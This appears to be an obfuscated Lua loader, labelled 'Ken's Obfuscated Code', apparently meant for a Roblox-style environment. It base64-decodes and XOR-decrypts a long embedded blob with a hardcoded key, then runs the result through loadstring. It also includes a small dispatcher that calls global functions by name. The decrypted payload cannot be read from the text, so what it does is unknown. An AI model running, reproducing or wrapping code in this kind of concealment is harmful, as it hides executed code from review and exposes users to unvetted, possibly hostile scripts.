-- Ken's Obfuscated Code

local b64_0x111lll = {}
local char_0xlIIIl1='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
for i_0xIIIlll=1,#char_0xlIIIl1 do b64_0x111lll[char_0xlIIIl1:sub(i_0xIIIlll,i_0xIIIlll)] = i_0xIIIlll - 1 end

function b64_0x111lll.dec_0xII1IIl(d_0xIlIIII)
    d_0xIlIIII = string.gsub(d_0xIlIIII, '[^'..char_0xlIIIl1..'=]', '')
    local r_0xl1llll = {}
    for i_0xIIIlll=1, #d_0xIlIIII, 4 do
        local c_0xlII1ll = b64_0x111lll[d_0xIlIIII:sub(i_0xIIIlll,i_0xIIIlll)] or 0
        local c_0xl1Il1l = b64_0x111lll[d_0xIlIIII:sub(i_0xIIIlll+1,i_0xIIIlll+1)] or 0
        
        local c_0xIIllll, c_0x1l1III = 0, 0
        local has3 = true
        local has4 = true

        local ch3 = d_0xIlIIII:sub(i_0xIIIlll+2,i_0xIIIlll+2)
        if ch3 == "=" then has3 = false else c_0xIIllll = b64_0x111lll[ch3] or 0 end

        local ch4 = d_0xIlIIII:sub(i_0xIIIlll+3,i_0xIIIlll+3)
        if ch4 == "=" then has4 = false else c_0x1l1III = b64_0x111lll[ch4] or 0 end
        
        local b_0xlllIIl = c_0xlII1ll * (2^18) + c_0xl1Il1l * (2^12) + c_0xIIllll * (2^6) + c_0x1l1III
        
        local b_0xlll1ll = math.floor(b_0xlllIIl / (2^16)) % (2^8)
        local b_0xII1llI = math.floor(b_0xlllIIl / (2^8)) % (2^8)
        local b_0xlI1lIl = b_0xlllIIl % (2^8)
        
        table.insert(r_0xl1llll, string.char(b_0xlll1ll))
        if has3 then table.insert(r_0xl1llll, string.char(b_0xII1llI)) end
        if has4 then table.insert(r_0xl1llll, string.char(b_0xlI1lIl)) end
    end
    return table.concat(r_0xl1llll)
end


local function bxor_0xlIIl1l(a_0x1l1lI1,b_0xIlIIIl)
    if bit32 then return bit32.bxor(a_0x1l1lI1,b_0xIlIIIl) end
    local r_0xI1lIlI = 0
    for i_0xlIIII1 = 0, 7 do
        local x_0xI11llI = a_0x1l1lI1 % 2
        local y_0xIllIll = b_0xIlIIIl % 2
        if x_0xI11llI ~= y_0xIllIll then r_0xI1lIlI = r_0xI1lIlI + (2^i_0xlIIII1) end
        a_0x1l1lI1 = math.floor(a_0x1l1lI1 / 2)
        b_0xIlIIIl = math.floor(b_0xIlIIIl / 2)
    end
    return r_0xI1lIlI
end


local function dec_0xll1I1l(s_0xll1Ill, k_0x1llllI)
    local r_0xII1llI = {}
    for i_0xlIlI11=1, #s_0xll1Ill do
        local b_0xlllIll = string.byte(s_0xll1Ill, i_0xlIlI11)
        local kb_0xl1lIll = string.byte(k_0x1llllI, (i_0xlIlI11-1) % #k_0x1llllI + 1)
        r_0xII1llI[i_0xlIlI11] = string.char(bxor_0xlIIl1l(b_0xlllIll, kb_0xl1lIll))
    end
    return table.concat(r_0xII1llI)
end


local d_0x11llI1 = {
  {op=255, val="IiIbMh5VCE08Px09BiUHWS0oMTdSSEtfLyAdfSIZClsrBBxZHhoIWSJtGyYABw5WOhgWOgQQGUsrBBxzT1UMWSMoVhQTGA5xKkcUPBEUBxgeIRkqFwcYGHNtHzIfEFF/KzkrNgADAlsrZVoDHhQSXTw+Wnp4GQRbLyFYPx0WClQeIRkqFwdLBW4dFDILEBlLYAEXMBMZO1QvNB0hUlhGGK7107PK1ouA+a3A/pLM6Nj2x5jq+1UMWSMoVhkdFyJcbq3B0JLN8tj215jrwJXTv671+bPK1ouA3a3A5lKV0rmu9e2zy/2LgNWtwNKSzf7Y9vlYBhwcHV08Ph0aFlWLgMqtwOSSzcYYKSwVNlwyClUrBBxZeFhGGK70+LPK9IuBya3AyZLN9Nj2/Jjr9ZXTua709LPK/4uA/63AypLM6tj275jr85XSvK7137PL/IuBzq3AzZLN3Nj3xZjr35XSu67107PL/IuBzq3A8JLN3tj275jr85XTs6708bPKxouByq3Ax5LM4tj2ypjq+pXTiq712nNaldK8rvXZs8v9i4HOrcDIks3O2Pb6mOvfldO/rvXis8rWi4DtrcDEks3a2PbZUVkeGghZIm0eJhwWH1EhI1ghBxs4XS98UHp4VUsYbj0KOhwBQxocOBY9GxsMAm4eHTJSREsQCigeMgcZHxghP1gAAhAIUSgkG3pQXGEYbm1YPx0UD0s6PxE9FV0MWSMoQhsGARt/KzlQcRoBH0g9d1d8ABQcFikkDDsHFx5LKz8bPBwBDlY6Yxs8H1ogXSAuEDpBWiBULwYNKj4QABUdLBE/HQcbUSsuHXwAEA1LYSUdMhYGRFUvJBZ8ARQCVCE/CDoXFg5nIS8eJgEWCkwrKVY/BxRJEWdlUVkXGw8yRCEXMBMZS147IxsnGxoFGDw4FgAXFFkQZ0dYc1JVG0onIwx7UCceViAkFjRIVThdL21KcVt/SxhubRQ8ExEYTDwkFjRaEgpVK3cwJwYFLF06ZVo7BgEbS3RiVyETAkVfJzkQJhAAGF08Lhc9BhAFTGAuFz5dPg5WLSURYF0+B1kFOAEfFx5Gay8kFDwABQJdLShXIRcTGBcmKBk3AVoGWScjVwAXFFkWIjgZcVtcQxFEKBY3eH9GFW6twPCSzdnY9u+Y6/OV04qu9dtzIhkKWysEHHOSzOvY9sSY6+yV04qu9cizy/WLgMatwOGSzdvY9sWY6/V/B1ctLBRzAhkKWyseGyEbBR9LbnBYKHhVSxhuFk9kRUFcDnt1SmZDR1gOE21FcwAABWsrLEl/eFVLGG4WSWBCRF0PfHtPakdHWgF3EFhuUgceVh0oGWF4CGEyY2BYYlxVi4DbrcDwks3M2PbFmOvYldOVrvXis8r9i4D8rcDSUiUHWS0oMTdSldO5rvTws8rYi4DXRxE1UgUHWS0oKzAAHBtMPRYbJgAHDlY6HRQyERAiXBNtDDsXG2EYbm1YIx4UCF0dLgo6AgEYYy04CiEXGx9oIiwbNjsRNhBnR1hzUlVhFWNtSn1SldOurvTxs8rHi4HKrcDykszj2PfNmOv6ldOVbh0UMhEQIlxurcHSks3+2PfFWBQTGA5xKm1QBhwcHV08Ph0aFlxL2PbYmOvRldO/rvX5s8rEi4DUrcDEks3e2PfFmOvzldOLrvXTs8rsi4DaRx0/ARACXm4uDSEAEAVMGyMRJRcHGF0HKVhuT1VSCXZ7T2JLRF0MbjkQNhx/SxhubQghGxsfEGweHTJDV0Iybm1YcwAABWsrLEl7W39hXSI+HVlSVUsYY2BYs8r0i4DtrcDAks3e2PfJmOvTldKwrvT4s8r3i4HHrcDhkszr2PbKmOvFldKwrvXVs8rsi4HKrcDRks3G2Pb9mOr2ldObrvT4s8rQi4DsR1hzUlUHVy0sFAMeFBJdPHczOhEeQxodLgo6AgFLdiE5WAAHBRtXPDlaengQBVw=", is_enc=true},
}
local pc_0xll1lll = 1
local stk_0xIIlIl1 = {}


local disp_0xIllll1 = {
    [0xA1] = function(s, v) table.insert(s, v) end, 
    [0xA2] = function(s, v) table.insert(s, tonumber(v)) end, 
    [0xB0] = function(s, n) 
        local f = table.remove(s) 
        if type(f) == "function" then f() 
        elseif type(f) == "string" then 
            local g = getfenv(2) or _G
            if g[f] then g[f](table.remove(s)) 
            else print("[LBI Error] Unknown function: " .. tostring(f)) end
        end 
    end,
    [0xFF] = function(s, v) 
        local fn, err = loadstring(v)
        if not fn then
            print("[LBI Error] Script Load Failed: " .. tostring(err))
        else
            local success, run_err = pcall(fn)
            if not success then
                print("[LBI Error] Script Runtime Failed: " .. tostring(run_err))
            end
        end
    end
}


while pc_0xll1lll <= #d_0x11llI1 do
    local inst = d_0x11llI1[pc_0xll1lll]
    local opcode = inst.op
    local val = inst.val
    
    if inst.is_enc then
        val = dec_0xll1I1l(b64_0x111lll.dec_0xII1IIl(val), "NMxSruk8")
    end
    
    local handler = disp_0xIllll1[opcode]
    if handler then
        handler(stk_0xIIlIl1, val)
    end
    
    pc_0xll1lll = pc_0xll1lll + 1
end
